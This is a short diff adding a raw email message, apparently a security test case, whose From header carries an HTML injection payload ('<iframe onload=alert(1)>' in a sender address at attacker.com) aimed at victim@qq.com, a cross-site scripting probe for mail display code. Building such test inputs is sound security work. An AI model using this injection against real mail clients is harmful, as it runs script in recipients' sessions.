@@ -1,0 +1,7 @@
+From: <"<iframe onload=alert(1)>@attacker.com">
+Subject: 12
+To: victim@qq.com
+MIME-Version: 1.0
+Content-type: text/html
+
+12
